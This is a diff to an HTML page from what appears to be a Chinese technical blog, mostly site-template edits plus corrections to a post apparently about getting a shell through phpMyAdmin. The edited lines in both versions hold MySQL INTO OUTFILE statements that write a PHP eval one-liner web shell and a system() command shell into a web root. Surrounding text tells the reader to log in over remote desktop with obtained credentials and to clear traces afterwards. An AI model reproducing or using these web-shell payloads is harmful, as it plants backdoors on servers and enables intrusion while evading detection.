@@ -188,6 +188,14 @@ phpMyadmin执行以下命令：1S">
         
 
             <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Java学习笔记/">
+                    Java学习笔记 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/技术花絮/">
                     技术花絮 <span class="right">3 篇</span></a>
                 </a>
@@ -206,14 +214,6 @@ phpMyadmin执行以下命令：1S">
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/生活随笔/">
                     生活随笔 <span class="right">1 篇</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Java学习笔记/">
-                    Java学习笔记 <span class="right">1 篇</span></a>
                 </a>
             </li>
 
@@ -340,8 +340,8 @@ phpMyadmin执行以下命令：1S">
 <p>运行mstsc开启远程桌面，输入上面获取到的账号和密码登陆。</p>
 <p>最后，记得清除痕迹。</p>
 <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>上面演示了<code>secure_file_priv</code>值为空的情况，那么如果<code>secure_file_priv</code>不为空该怎么办？</p>
-<p>一句话还可以这样插入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`informationes` (`inform` TEXT NOT NULL);</span><br><span class="line">INSERT INTO `mysql`.`informationes` (`inform`) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);</span><br><span class="line">SELECT `inform` from `mysql`.`informationes` into outfile &apos;e:/phpStudy/WWW/infos.php&apos;;</span><br><span class="line">DROP table if exists `mysql`.`informationes`;</span><br><span class="line">（注意： D:/phpStudy/WWW/为网站的绝对路径）</span><br></pre></td></tr></table></figure></p>
-<p>导出具有命令权限的Shell的php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ‘&lt;?php echo \’&lt;pre&gt;\’;system($_POST[\&apos;muma\&apos;]);echo \’&lt;/pre&gt;\’;?&gt;’ into outfile ‘D:/phpStudy/WWW/test.php’;</span><br></pre></td></tr></table></figure></p>
+<p>一句话还可以这样插入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`informationes` (`inform` TEXT NOT NULL);</span><br><span class="line">INSERT INTO `mysql`.`informationes` (`inform`) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);</span><br><span class="line">SELECT `inform` from `mysql`.`informationes` into outfile &apos;D:/phpStudy/WWW/infos.php&apos;;</span><br><span class="line">DROP table if exists `mysql`.`informationes`;</span><br><span class="line">（注意： D:/phpStudy/WWW/为网站的绝对路径）</span><br></pre></td></tr></table></figure></p>
+<p>导出具有命令权限的Shell的php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_POST[\&apos;muma\&apos;]);echo \&apos;&lt;/pre&gt;\&apos;;?&gt;&apos; into outfile &apos;D:/phpStudy/WWW/test.php/&apos;;</span><br></pre></td></tr></table></figure></p>
 
                 
 <p class="pink-link-context">
@@ -400,7 +400,7 @@ phpMyadmin执行以下命令：1S">
                     </a>
                 
                 
-    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
     </script>
     <div class="site-visitors-container white-text">
         <span>
@@ -413,7 +413,6 @@ phpMyadmin执行以下命令：1S">
             <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
         </span>
     </div>
-
 
             </div>
             
@@ -662,15 +661,6 @@ phpMyadmin执行以下命令：1S">
 
 
 
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
-});
-</script>
-<script type="text/javascript" async
-  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
-</script>
 
 
 
